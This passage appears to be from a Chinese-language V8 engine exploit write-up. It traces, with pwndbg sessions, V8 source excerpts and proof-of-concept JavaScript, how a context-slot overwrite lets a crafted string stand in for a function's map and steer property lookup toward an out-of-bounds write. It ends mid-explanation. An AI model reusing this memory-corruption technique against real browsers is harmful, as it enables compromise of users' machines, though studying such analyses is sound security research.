&lt;Builtins_StaCurrentContextSlotHandler+65&gt;\n    ↓\n   0x7f4a3b433941 &lt;Builtins_StaCurrentContextSlotHandler+65&gt;     mov    rbx, qword ptr [rbx - 8]\n   0x7f4a3b433945 &lt;Builtins_StaCurrentContextSlotHandler+69&gt;     lea    rdx, [rdx*8 + 0xf]\n ► 0x7f4a3b43394d &lt;Builtins_StaCurrentContextSlotHandler+77&gt;     mov    qword ptr [rbx + rdx], rax\n   0x7f4a3b433951 &lt;Builtins_StaCurrentContextSlotHandler+81&gt;     mov    rsi, -0x80000\npwndbg&gt; job $rbx\n0x21f372c1ed09: [Context] in OldSpace\n - map: 0x0cfeb6b81049 &lt;Map&gt;\n - length: 5\n - scope_info: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;\n - previous: 0x21f372c01749 &lt;NativeContext[247]&gt;\n - extension: 0x0cfeb6b805b1 &lt;the_hole&gt;\n - native_context: 0x21f372c01749 &lt;NativeContext[247]&gt;\n           0: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;\n           1: 0x21f372c01749 &lt;NativeContext[247]&gt;\n           2: 0x0cfeb6b805b1 &lt;the_hole&gt;\n           3: 0x21f372c01749 &lt;NativeContext[247]&gt;\n           4: 0x37962980c941 &lt;JSArray[3]&gt;\npwndbg&gt; job 0x37962980c941\n0x37962980c941: [JSArray]\n - map: 0x078e20f82de9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]\n - prototype: 0x21f372c10c89 &lt;JSArray[0]&gt;\n - elements: 0x37962980c919 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]\n - length: 3\n - properties: 0x0cfeb6b80c21 &lt;FixedArray[0]&gt; &#123;\n    #length: 0x198440c801a9 &lt;AccessorInfo&gt; (const accessor descriptor)\n &#125;\n - elements: 0x37962980c919 &lt;FixedDoubleArray[3]&gt; &#123;\n           0: 1.1\n           1: 2.2\n           2: 3.3\n &#125;\n\n.............................................\n   0x7f4a3b43394d &lt;Builtins_StaCurrentContextSlotHandler+77&gt;     mov    qword ptr [rbx + rdx], rax\n ► 0x7f4a3b433951 &lt;Builtins_StaCurrentContextSlotHandler+81&gt;     mov    rsi, -0x80000\npwndbg&gt; job $rbx\n0x21f372c1ed09: [Context] in OldSpace\n - map: 0x0cfeb6b81049 &lt;Map&gt;\n - length: 5\n - scope_info: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;\n - previous: 0x21f372c01749 &lt;NativeContext[247]&gt;\n - extension: 0x0cfeb6b805b1 &lt;the_hole&gt;\n - native_context: 0x21f372c01749 &lt;NativeContext[247]&gt;\n           0: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;\n           1: 0x21f372c01749 &lt;NativeContext[247]&gt;\n           2: 0x0cfeb6b805b1 &lt;the_hole&gt;\n           3: 0x21f372c01749 &lt;NativeContext[247]&gt;\n           4: 0x37962980caa1 &lt;String[100]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&gt;\n\n可见，这里可以修改内存里的数据，并且没有边界检查，并且我们发现在Context的第4个插槽后方正好就是fun对象\npwndbg&gt; x /100gx 0x21f372c1ed08\n0x21f372c1ed08: 0x00000cfeb6b81049  0x0000000500000000\n0x21f372c1ed18: 0x000021f372c1e8a1  0x000021f372c01749\n0x21f372c1ed28: 0x00000cfeb6b805b1  0x000021f372c01749\n0x21f372c1ed38: 0x000037962980caa1  0x0000078e20f803b9\npwndbg&gt; job 0x21f372c1ed41\n0x21f372c1ed41: [Function] in OldSpace\n - map: 0x078e20f803b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]\n - prototype: 0x21f372c01ff1 &lt;JSFunction (sfi = 0x198440c88009)&gt;\n - elements: 0x0cfeb6b80c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]\n - function prototype: \n - initial_map: \n - shared_info: 0x21f372c1e9a1 &lt;SharedFunctionInfo fun&gt;\n - name: 0x21f372c1e7b9 &lt;String[#3]: fun&gt;\n\n那么，我们可以在f函数里增加几个变量，就可以覆盖fun对象的MAP。\nfunction fun() &#123;\n   var f = (v1 = (function() &#123;\n      let a = 0;\n      let b = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      (function() &#123;\n         print(&quot;f1&quot;);\n      &#125;);\n      (function() &#123;\n         print(&quot;f2&quot;);\n         //修改arr指针为a\n         a = [1.1,2.2,3.3];\n         //修改fun的MAP为b\n         b = &quot;a&quot;.repeat(10);\n      &#125;);\n   &#125;))=&gt;&#123;&#125;;\n   f();\n&#125;\n\nlet arr = &#123;&#125;;\n\nfunction fun2() &#123;\n   fun();\n&#125;\n\nfunction fun3() &#123;\n   fun();\n&#125;\n\nfun2();\n//%DebugPrint(fun);\n//%SystemBreak();\nfun3();\n\nfun[0x66] = 0x123;\n\n运行后发现崩溃\nroot@ubuntu:~/Desktop/v8/out.gn/x64.debug.bug# ./d8 poc.js\nf2\nabort: CSA_ASSERT failed: IsMap(map) [../../src/code-stub-assembler.cc:5929]\n\n显然是因为我们覆盖了fun函数对象的MAP为b对象的地址，导致DCHECK的检查不通过。但在Release版本里是没有DCHECK的，运行后发现无报错崩溃，那么最后一句fun[0]发生了什么，0x123被写入到哪了？\nKeyedStoreICV8中使用StaKeyedProperty字节码处理下标赋值的操作，该字节码首先会调用Builtins_KeyedStoreIC函数\nvoid AccessorAssembler::KeyedStoreIC(const StoreICParameters* p) &#123;\nvoid AccessorAssembler::KeyedStoreIC(const StoreICParameters* p) &#123;\n.....................................\n    Node* receiver_map = LoadReceiverMap(p-&gt;receiver);\n    GotoIf(IsDeprecatedMap(receiver_map), &amp;miss);\n.....................................\n  BIND(&amp;miss);\n  &#123;\n    Comment(&quot;KeyedStoreIC_miss&quot;);\n    TailCallRuntime(Runtime::kKeyedStoreIC_Miss, p-&gt;context, p-&gt;value, p-&gt;slot,\n                    p-&gt;vector, p-&gt;receiver, p-&gt;name);\n  &#125;\n&#125;\n\n由于这里receiver_map直接取到的就是我们在fun函数中创建的b字符串对象，而对象地址是具有随机性的，因此有很大的几率到达miss标签，这里是处理IC缓存缺失的情况，调用慢方法KeyedStoreIC_Miss。KeyedStoreIC_Miss的调用链为KeyedStoreIC_Miss-&gt;KeyedStoreIC::Store-&gt;Runtime::SetObjectProperty。其中Runtime::SetObjectProperty源码如下\nMaybeHandle&lt;Object&gt; Runtime::SetObjectProperty(\n    Isolate* isolate, Handle&lt;Object&gt; object, Handle&lt;Object&gt; key,\n    Handle&lt;Object&gt; value, StoreOrigin store_origin,\n    Maybe&lt;ShouldThrow&gt; should_throw) &#123;\n......................\n  // Check if the given key is an array index.\n  bool success = false;\n  LookupIterator it =\n      LookupIterator::PropertyOrElement(isolate, object, key, &amp;success);\n  if (!success) return MaybeHandle&lt;Object&gt;();\n\n  if (!it.IsFound() &amp;&amp; key-&gt;IsSymbol() &amp;&amp;\n      Symbol::cast(*key)-&gt;is_private_name()) &#123;\n    Handle&lt;Object&gt; name_string(Symbol::cast(*key)-&gt;name(), isolate);\n    DCHECK(name_string-&gt;IsString());\n    THROW_NEW_ERROR(isolate,\n                    NewTypeError(MessageTemplate::kInvalidPrivateFieldWrite,\n                                 name_string, object),\n                    Object);\n  &#125;\n\n  MAYBE_RETURN_NULL(\n      Object::SetProperty(&amp;it, value, store_origin, should_throw));\n\n  return value;\n&#125;\n\n该函数调用LookupIterator::PropertyOrElement函数，这个函数的作用是根据key，从对象的prototype链中寻找合适的holder,(即寻找与这个key合适的数组，这样后面可以将数据存入对应的数组)，具体过程如下\nLookupIterator LookupIterator::PropertyOrElement(\n    Isolate* isolate, Handle&lt;Object&gt; receiver, Handle&lt;Name&gt; name,\n    Configuration configuration) &#123;\n  uint32_t index;\n  if (name-&gt;AsArrayIndex(&amp;index)) &#123;\n    LookupIterator it = LookupIterator(isolate, receiver, index, configuration);\n    it.name_ = name;\n    return it;\n  &#125;\n  return LookupIterator(isolate, receiver, name, configuration);\n&#125;\n\n调试运行\n   57   uint32_t index = 0;\n   58   if (key-&gt;ToArrayIndex(&amp;index)) &#123;\n   59     *success = true;\n ► 60     return LookupIterator(isolate, receiver, index, configuration);\n   61   &#125;\npwndbg&gt; p/x index\n$137 = 0x66\n\n可以知道它会继续调用LookupIterator，跟进去\nLookupIterator::LookupIterator(Isolate* isolate, Handle&lt;Object&gt; receiver,\n                               uint32_t index, Configuration configuration)\n    : LookupIterator(isolate, receiver, index,\n                     GetRoot(isolate, receiver, index), configuration) &#123;&#125;\n\n这里会调用GetRoot\nHandle&lt;JSReceiver&gt; LookupIterator::GetRoot(Isolate* isolate,\n                                           Handle&lt;Object&gt; receiver,\n                                           uint32_t index) &#123;\n  if (receiver-&gt;IsJSReceiver()) return Handle&lt;JSReceiver&gt;::cast(receiver);\n  return GetRootForNonJSReceiver(isolate, receiver, index);\n&#125;\n\n如果满足条件receiver-&gt;IsJSReceiver()，则直接返回原对象，否则会创建一个新的NewJSObject，显然这不是我们想要的\nHandle&lt;JSReceiver&gt; LookupIterator::GetRootForNonJSReceiver(\n    Isolate* isolate, Handle&lt;Object&gt; receiver, uint32_t index) &#123;\n  // Strings are the only objects with properties (only elements) directly on\n  // the wrapper. Hence we can skip generating the wrapper for all other cases.\n  if (index != kMaxUInt32 &amp;&amp; receiver-&gt;IsString() &amp;&amp;\n      index &lt; static_cast&lt;uint32_t&gt;(String::cast(*receiver)-&gt;length())) &#123;\n    // TODO(verwaest): Speed this up. Perhaps use a cached wrapper on the native\n    // context, ensuring that we don&#39;t leak it into JS?\n    Handle&lt;JSFunction&gt; constructor = isolate-&gt;string_function();\n    Handle&lt;JSObject&gt; result = isolate-&gt;factory()-&gt;NewJSObject(constructor);\n    Handle&lt;JSValue&gt;::cast(result)-&gt;set_value(*receiver);\n    return result;\n  &#125;\n  auto root =\n      handle(receiver-&gt;GetPrototypeChainRootMap(isolate)-&gt;prototype(), isolate);\n  if (root-&gt;IsNull(isolate)) &#123;\n    isolate-&gt;PushStackTraceAndDie(reinterpret_cast&lt;void*&gt;(receiver-&gt;ptr()));\n  &#125;\n  return Handle&lt;JSReceiver&gt;::cast(root);\n&#125;\n\n因为我们希望能够通过已有的数据构造出一个Prototype链，而不是创建一个新的。那么receiver-&gt;IsJSReceiver()是怎么判断的呢？最终会调用到IsJSReceiver(InstanceType instance_type)\nV8_INLINE bool IsJSReceiver(InstanceType instance_type) &#123;\n  STATIC_ASSERT(LAST_TYPE == LAST_JS_RECEIVER_TYPE);\n  return instance_type &gt;= FIRST_JS_RECEIVER_TYPE;\n&#125;\n.................\nFIRST_JS_RECEIVER_TYPE = JS_PROXY_TYPE,\n........\n  JS_PROXY_TYPE = 0x0400,  // FIRST_JS_RECEIVER_TYPE\n  JS_GLOBAL_OBJECT_TYPE,   // FIRST_JS_OBJECT_TYPE\n  JS_GLOBAL_PROXY_TYPE,\n  JS_MODULE_NAMESPACE_TYPE,\n  // Like JS_API_OBJECT_TYPE, but requires access checks and/or has\n  // interceptors.\n  JS_SPECIAL_API_OBJECT_TYPE = 0x0410,  // LAST_SPECIAL_RECEIVER_TYPE\n\n这个TYPE实际上就是MAP对象中偏移0xc处的一个数据，我们可以使用如下代码调试观察\nvar a = new Proxy(&#123;&#125;,&#123;&#125;);\n%DebugPrint(a);\n%SystemBreak();\n\npwndbg&gt; job 0x05fe41603e79\n0x5fe41603e79: [Map]\n - type: JS_PROXY_TYPE\npwndbg&gt; x /20wx 0x05fe41603e78\n0x5fe41603e78:  0xd2c80189  0x0000207f  0x2e000004  0x19000400\n\n那么现在，由于string对象成为了MAP，那么为了绕过这里的坎，我们要保证&amp;string+0xc处的short数据&gt;&#x3D;0x400，我们使用如下代码进行调试观察一下string的结构\nvar a = &#39;a&#39;.repeat(0x400);\nvar b = [a];\n%DebugPrint(b);\n%SystemBreak();\n..............................\n - elements: 0x26799f98c839 &lt;FixedArray[1]&gt; &#123;\n           0: 0x26799f98c819 &lt;String[1024]: aaaa......\n.............................\n\n可以知道string对象地址为0x26799f98c819，我们查看数据\npwndbg&gt; x /20wx 0x26799f98c818\n0x26799f98c818: 0xb5e81e59  0x00002de1  0x00000003  0x00000400\n\n可以发现，在0xc的位置正好是字符串长度，因为，我们可以通过控制字符串长度来伪造MAP结构中的TYPE。于是，我们将POC代码改为如下\n.....................\n         print(&quot;f2&quot;);\n         //修改arr指针为a\n         a = [1.1,2.2,3.3];\n         //修改fun的MAP为b\n         b = &quot;a&quot;.repeat(0x400);\n.............\n\n然后进行调试\n   155 Handle&lt;JSReceiver&gt; LookupIterator::GetRoot(Isolate* isolate,\n   156                                            Handle&lt;Object&gt; receiver,\n   157                                            uint32_t index) &#123;\n ► 158   if (receiver-&gt;IsJSReceiver()) return Handle&lt;JSReceiver&gt;::cast(receiver);\n   159   return GetRootForNonJSReceiver(isolate, receiver, index);\n   160 &#125;\npwndbg&gt; p receiver-&gt;IsJSReceiver()\n$138 = true\n\n这次满足要求，便可以直接返回。接下来进入LookupIterator的构造函数\nIn file: /home/sea/Desktop/v8/src/lookup.h\n   71         initial_holder_(holder),\n   72         index_(index),\n   73         number_(static_cast&lt;uint32_t&gt;(DescriptorArray::kNotFound)) &#123;\n   74     // kMaxUInt32 isn&#39;t a valid index.\n   75     DCHECK_NE(kMaxUInt32, index_);\n ► 76     Start&lt;true&gt;();\n   77   &#125;\n\nStart函数调用LookupInHolder函数\nIn file: /home/sea/Desktop/v8/src/lookup.cc\n   151   holder_ = initial_holder_;\n   152 \n   153   JSReceiver holder = *holder_;\n   154   Map map = holder-&gt;map();\n   155 \n ► 156   state_ = LookupInHolder&lt;is_element&gt;(map, holder);\n\n我们继续跟进\n   220   inline State LookupInHolder(Map map, JSReceiver holder) &#123;\n ► 221     return map-&gt;IsSpecialReceiverMap()\n   222                ? LookupInSpecialHolder&lt;is_element&gt;(map, holder)\n   223                : LookupInRegularHolder&lt;is_element&gt;(map, holder);\n   224   &#125;\npwndbg&gt; p map-&gt;IsSpecialReceiverMap()\n$139 = true\n\n这里会判断SpecialReceiverMap，其判断的逻辑为\ninline bool IsSpecialReceiverInstanceType(InstanceType instance_type) &#123;\n  return instance_type &lt;= LAST_SPECIAL_RECEIVER_TYPE;\n&#125;\n\n// This should be in objects/map-inl.h, but can&#39;t, because of a cyclic\n// dependency.\nbool Map::IsSpecialReceiverMap() const &#123;\n  bool result = IsSpecialReceiverInstanceType(instance_type());\n  DCHECK_IMPLIES(!result,\n                 !has_named_interceptor() &amp;&amp; !is_access_check_needed());\n  return result;\n&#125;\n...............\n // Boundary for testing JSReceivers that need special property lookup handling\n  LAST_SPECIAL_RECEIVER_TYPE = JS_SPECIAL_API_OBJECT_TYPE,\n  JS_SPECIAL_API_OBJECT_TYPE = 0x0410,  // LAST_SPECIAL_RECEIVER_TYPE\n\n可见这里也是根据MAP中的TYPEID来进行判断的，因此也是可以被我们控制。IsSpecialReceiverMap()为true后，会调用LookupInSpecialHolder函数\ntemplate &lt;bool is_element&gt;\nLookupIterator::State LookupIterator::LookupInSpecialHolder(\n    Map const map, JSReceiver const holder) &#123;\n  STATIC_ASSERT(INTERCEPTOR == BEFORE_PROPERTY);\n  switch (state_) &#123;\n    case NOT_FOUND:\n      if (map-&gt;IsJSProxyMap()) &#123;\n        if (is_element || !name_-&gt;IsPrivate()) return JSPROXY;\n      &#125;\n      if (map-&gt;is_access_check_needed()) &#123;\n        if (is_element || !name_-&gt;IsPrivate()) return ACCESS_CHECK;\n      &#125;\n      V8_FALLTHROUGH;\n    case ACCESS_CHECK:\n      if (check_interceptor() &amp;&amp; HasInterceptor&lt;is_element&gt;(map) &amp;&amp;\n          !SkipInterceptor&lt;is_element&gt;(JSObject::cast(holder))) &#123;\n        if (is_element || !name_-&gt;IsPrivate()) return INTERCEPTOR;\n      &#125;\n      V8_FALLTHROUGH;\n    case INTERCEPTOR:\n      if (!is_element &amp;&amp; map-&gt;IsJSGlobalObjectMap()) &#123;\n        GlobalDictionary dict =\n            JSGlobalObject::cast(holder)-&gt;global_dictionary();\n        int number = dict-&gt;FindEntry(isolate(), name_);\n        if (number == GlobalDictionary::kNotFound) return NOT_FOUND;\n        number_ = static_cast&lt;uint32_t&gt;(number);\n        PropertyCell cell = dict-&gt;CellAt(number_);\n        if (cell-&gt;value()-&gt;IsTheHole(isolate_)) return NOT_FOUND;\n        property_details_ = cell-&gt;property_details();\n        has_property_ = true;\n        switch (property_details_.kind()) &#123;\n          case v8::internal::kData:\n            return DATA;\n          case v8::internal::kAccessor:\n            return ACCESSOR;\n        &#125;\n      &#125;\n.......................................\n\n由于我们的TYPEID伪造为0x400，因此map-&gt;IsJSProxyMap()返回true，导致LookupInSpecialHolder返回的类型为JSPROXY，这不是我们希望的，我们希望能返回DATA，因为这种类型能被我们进行读写，而PROXY不行。最终导致脚本运行结果如下\n./b.js:41: TypeError: Cannot perform &#39;set&#39; on a proxy that has been revoked\nfun[0x66] = 0x123;\n          ^\nTypeError: Cannot perform &#39;set&#39; on a proxy that has been revoked\n    at ./b.js:41:11\n\n那么，我们将TYPE ID增大，POC中代码修改为\n.....................\n         print(&quot;f2&quot;);\n         //修改arr指针为a\n         a = [1.1,2.2,3.3];\n         //修改fun的MAP为b\n         b = &quot;a&quot;.repeat(0x800);\n.............\n\n于是，这回我们将进入LookupInRegularHolder函数\n   220   inline State LookupInHolder(Map map, JSReceiver holder) &#123;\n   221     return map-&gt;IsSpecialReceiverMap()\n   222                ? LookupInSpecialHolder&lt;is_element&gt;(map, holder)\n ► 223                : LookupInRegularHolder&lt;is_element&gt;(map, holder);\n   224   &#125;\n\n其代码如下\ntemplate &lt;bool is_element&gt;\nLookupIterator::State LookupIterator::LookupInRegularHolder(\n    Map const map, JSReceiver const holder) &#123;\n  DisallowHeapAllocation no_gc;\n  if (interceptor_state_ == InterceptorState::kProcessNonMasking) &#123;\n    return NOT_FOUND;\n  &#125;\n\n  if (is_element) &#123;\n    JSObject js_object = JSObject::cast(holder);\n    ElementsAccessor* accessor = js_object-&gt;GetElementsAccessor();\n    FixedArrayBase backing_store = js_object-&gt;elements();\n    number_ =\n        accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);\n    if (number_ == kMaxUInt32) &#123;\n      return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;\n    &#125;\n    property_details_ = accessor-&gt;GetDetails(js_object, number_);\n  &#125; else if (!map-&gt;is_dictionary_map()) &#123;\n..................................\n  &#125;\n  has_property_ = true;\n  switch (property_details_.kind()) &#123;\n    case v8::internal::kData:\n      return DATA;\n    case v8::internal::kAccessor:\n      return ACCESSOR;\n  &#125;\n\n  UNREACHABLE();\n&#125;\n\n由于is_element默认为true，因此将进入is_element分支\n   1159   if (is_element) &#123;\n   1160     JSObject js_object = JSObject::cast(holder);\n   1161     ElementsAccessor* accessor = js_object-&gt;GetElementsAccessor();\n   1162     FixedArrayBase backing_store = js_object-&gt;elements();\n ► 1163     number_ =\n   1164         accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);\n   1165     if (number_ == kMaxUInt32) &#123;\n   1166       return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;\n   1167     &#125;\npwndbg&gt; p/x js_object-&gt;ptr_\n$145 = 0x61f6349ed01\npwndbg&gt; p/x backing_store-&gt;ptr_\n$147 = 0x317690b80c21\npwndbg&gt; x /20gx 0x61f6349ed00\n0x61f6349ed00:  0x00002deae918ce19  0x0000317690b80c21\n0x61f6349ed10:  0x0000317690b80c21  0x0000061f6349e999\n0x61f6349ed20:  0x0000061f6349ecc9  0x0000061f6349ec89\npwndbg&gt; job 0x317690b80c21\n0x317690b80c21: [FixedArray]\n - map: 0x317690b807b1 &lt;Map&gt;\n - length: 0\n\n可以知道，当前操作对象就是fun函数对象，取出了对象默认的elements()，然后调用GetEntryForIndex函数\n  static uint32_t GetEntryForIndexImpl(Isolate* isolate, JSObject holder,\n                                       FixedArrayBase backing_store,\n                                       uint32_t index, PropertyFilter filter) &#123;\n    DCHECK(IsFastElementsKind(kind()));\n    uint32_t length = Subclass::GetMaxIndex(holder, backing_store);\n    if (IsHoleyElementsKind(kind())) &#123;\n      return index &lt; length &amp;&amp;\n                     !BackingStore::cast(backing_store)\n                          -&gt;is_the_hole(isolate, index)\n                 ? index\n                 : kMaxUInt32;\n    &#125; else &#123;\n      return index &lt; length ? index : kMaxUInt32;\n    &#125;\n  &#125;\n\n该函数用于检查index是否与当前的这个elements合适，即index在length范围内的话，就能与当前的elements匹配成功。显然这里我们匹配失败。返回NOT_FOUND\n   1163     number_ =\n   1164         accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);\n   1165     if (number_ == kMaxUInt32) &#123;\n ► 1166       return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;\n   1167     &#125;\n\n于是，在LookupIterator::Start中，函数将继续执行NextInternal&lt;is_element&gt;(map, holder);开始遍历ProtoType链\n   157   if (IsFound()) return;\n   158 \n ► 159   NextInternal&lt;is_element&gt;(map, holder);\n   160 &#125;\n\n遍历的逻辑如下\ntemplate &lt;bool is_element&gt;\nvoid LookupIterator::NextInternal(Map map, JSReceiver holder) &#123;\n  do &#123;\n    JSReceiver maybe_holder = NextHolder(map);\n    if (maybe_holder.is_null()) &#123;\n      if (interceptor_state_ == InterceptorState::kSkipNonMasking) &#123;\n        RestartLookupForNonMaskingInterceptors&lt;is_element&gt;();\n        return;\n      &#125;\n      state_ = NOT_FOUND;\n      if (holder != *holder_) holder_ = handle(holder, isolate_);\n      return;\n    &#125;\n    holder = maybe_holder;\n    map = holder-&gt;map();\n    state_ = LookupInHolder&lt;is_element&gt;(map, holder);\n  &#125; while (!IsFound());\n\n  holder_ = handle(holder, isolate_);\n&#125;\n\n其中NextHolder就是取出prototype对象，然后返回\nJSReceiver LookupIterator::NextHolder(Map map) &#123;\n  DisallowHeapAllocation no_gc;\n  if (map-&gt;prototype() == ReadOnlyRoots(heap()).null_value()) &#123;\n    return JSReceiver();\n  &#125;\n  if (!check_prototype_chain() &amp;&amp; !map-&gt;has_hidden_prototype()) &#123;\n    return JSReceiver();\n  &#125;\n  return JSReceiver::cast(map-&gt;prototype());\n&#125;\n\n调试如下\nIn file: /home/sea/Desktop/v8/src/lookup.cc\n   183 \n   184 template &lt;bool is_element&gt;\n   185 void LookupIterator::NextInternal(Map map, JSReceiver holder) &#123;\n   186   do &#123;\n   187     JSReceiver maybe_holder = NextHolder(map);\n ► 188     if (maybe_holder.is_null()) &#123;\n   189       if (interceptor_state_ == InterceptorState::kSkipNonMasking) &#123;\n   190         RestartLookupForNonMaskingInterceptors&lt;is_element&gt;();\npwndbg&gt; p/x map-&gt;ptr_\n$150 = 0x2deae918ce19\npwndbg&gt; x /20gx 0x2deae918ce18\n0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003\n0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9\n0x2deae918ce38: 0xdeadbeedbeadbeef  0xdeadbeedbeadbeef\npwndbg&gt; p/x maybe_holder-&gt;ptr_\n$152 = 0x2deae918cdf9\npwndbg&gt; job 0x00002deae918cdf9\nc&quot;aaaaa..............\n\n可以看到，这里取到了第四项，由于MAP是我们用字符串对象伪造的，因此取到的prototype对象是字符串对象中的第四项，而此处正好也是字符串对象接下来调用LookupInHolder对当前prototype进行判断，是否符合要求。\n   198     map = holder-&gt;map();\n ► 199     state_ = LookupInHolder&lt;is_element&gt;(map, holder);\n   200   &#125; while (!IsFound());\npwndbg&gt; job map-&gt;ptr_\n0x317690b81e59: [Map]\n - type: CONS_ONE_BYTE_STRING_TYPE\n - instance size: 32\n.......................\n\n这次取到的MAP是字符串的MAP，会使用LookupInSpecialHolder进行处理,在LookupInSpecialHolder中调用了LookupInRegularHolder\nIn file: /home/sea/Desktop/v8/src/lookup.cc\n   1134             return DATA;\n   1135           case v8::internal::kAccessor:\n   1136             return ACCESSOR;\n   1137         &#125;\n   1138       &#125;\n ► 1139       return LookupInRegularHolder&lt;is_element&gt;(map, holder);\n\n主要逻辑仍然是将对应的elements取出来判断index是否在length范围内。\nIn file: /home/sea/Desktop/v8/src/lookup.cc\n   1160     JSObject js_object = JSObject::cast(holder);\n   1161     ElementsAccessor* accessor = js_object-&gt;GetElementsAccessor();\n   1162     FixedArrayBase backing_store = js_object-&gt;elements();\n   1163     number_ =\n   1164         accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);\n ► 1165     if (number_ == kMaxUInt32) &#123;\n   1166       return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;\n   1167     &#125;\npwndbg&gt; p/x js_object-&gt;ptr_\n$157 = 0x2deae918cdf9\npwndbg&gt; x /20gx 0x2deae918cdf8\n0x2deae918cdf8: 0x0000317690b81e59  0x0000040000000003\n0x2deae918ce08: 0x00002deae918cdd9  0x00002deae918cdd9\n0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003\n0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9\n........\npwndbg&gt; p/x backing_store-&gt;ptr_\n$158 = 0x2deae918cdd9\npwndbg&gt; x /20gx 0x2deae918cdd8\n0x2deae918cdd8: 0x0000317690b81e59  0x0000020000000003\n0x2deae918cde8: 0x00002deae918cdb9  0x00002deae918cdb9\n0x2deae918cdf8: 0x0000317690b81e59  0x0000040000000003\n0x2deae918ce08: 0x00002deae918cdd9  0x00002deae918cdd9\n0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003\n0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9\n...........\npwndbg&gt; p number_\n$159 = 102\n\n显然，这回条件是满足的，index在这个elements的length范围内，于是执行到后面，返回DATA\nIn file: /home/sea/Desktop/v8/src/lookup.cc\n   1181     property_details_ = dict-&gt;DetailsAt(number_);\n   1182   &#125;\n   1183   has_property_ = true;\n   1184   switch (property_details_.kind()) &#123;\n   1185     case v8::internal::kData:\n ► 1186       return DATA;\n   1187     case v8::internal::kAccessor:\n   1188       return ACCESSOR;\n   1189   &#125;\n\n这样LookupIterator it =       LookupIterator::PropertyOrElement(isolate, object, key, &amp;success);从prototype链上成功找到了合适的elements对象，然后回到Runtime::SetObjectProperty继续执行到这里\nIn file: /home/sea/Desktop/v8/src/runtime/runtime-object.cc\n   366                     NewTypeError(MessageTemplate::kInvalidPrivateFieldWrite,\n   367                                  name_string, object),\n   368                     Object);\n   369   &#125;\n   370 \n ► 371   MAYBE_RETURN_NULL(\n   372       Object::SetProperty(&amp;it, value, store_origin, should_throw));\n   373 \n   374   return value;\n   375 &#125;\n\nSetObjectProperty调用了SetPropertyInternal，\nMaybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it,\n                                        Handle&lt;Object&gt; value,\n                                        Maybe&lt;ShouldThrow&gt; should_throw,\n                                        StoreOrigin store_origin, bool* found) &#123;\n  it-&gt;UpdateProtector();\n  DCHECK(it-&gt;IsFound());\n\n  // Make sure that the top context does not change when doing callbacks or\n  // interceptor calls.\n  AssertNoContextChange ncc(it-&gt;isolate());\n\n  do &#123;\n    switch (it-&gt;state()) &#123;\n      case LookupIterator::NOT_FOUND:\n        UNREACHABLE();\n......................\n\n      case LookupIterator::DATA:\n        if (it-&gt;IsReadOnly()) &#123;\n          return WriteToReadOnlyProperty(it, value, should_throw);\n        &#125;\n        if (it-&gt;HolderIsReceiverOrHiddenPrototype()) &#123;\n          return SetDataProperty(it, value);\n        &#125;\n        V8_FALLTHROUGH;\n      case LookupIterator::TRANSITION:\n.................\n    &#125;\n    it-&gt;Next();\n  &#125; while (it-&gt;IsFound());\n\n  *found = false;\n  return Nothing&lt;bool&gt;();\n&#125;\n\n得饶过it-&gt;IsReadOnly()，其逻辑如下\nbool IsReadOnly() const &#123; return property_details().IsReadOnly(); &#125;\nbool IsReadOnly() const &#123; return (attributes() &amp; READ_ONLY) != 0; &#125;\n\n由于property_details_是在LookupInRegularHolder阶段创建的\ntemplate &lt;bool is_element&gt;\nLookupIterator::State LookupIterator::LookupInRegularHolder(\n    Map const map, JSReceiver const holder) &#123;\n...........\n  if (is_element) &#123;\n.........\n    if (number_ == kMaxUInt32) &#123;\n      return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;\n    &#125;\n    property_details_ = accessor-&gt;GetDetails(js_object, number_);\n...............\n\n而GetDetails函数如下\n  PropertyDetails GetDetails(JSObject holder, uint32_t entry) final &#123;\n    return Subclass::GetDetailsImpl(holder, entry);\n  &#125;\n  static PropertyDetails GetDetailsImpl(JSObject holder, uint32_t entry) &#123;\n    return PropertyDetails(kData, NONE, PropertyCellType::kNoCell);\n  &#125;\n.............\n  PropertyDetails(PropertyKind kind, PropertyAttributes attributes,\n                  PropertyCellType cell_type, int dictionary_index = 0) &#123;\n    value_ = KindField::encode(kind) | LocationField::encode(kField) |\n             AttributesField::encode(attributes) |\n             DictionaryStorageField::encode(dictionary_index) |\n             PropertyCellTypeField::encode(cell_type);\n  &#125;\n\n因此attributes()是0，是直接绕过了it-&gt;IsReadOnly()条件，那么现在，我们得满足it-&gt;HolderIsReceiverOrHiddenPrototype()条件，才能调用SetDataProperty。HolderIsReceiverOrHiddenPrototype函数代码如下\nbool LookupIterator::HolderIsReceiverOrHiddenPrototype() const &#123;\n  DCHECK(has_property_ || state_ == INTERCEPTOR || state_ == JSPROXY);\n  // Optimization that 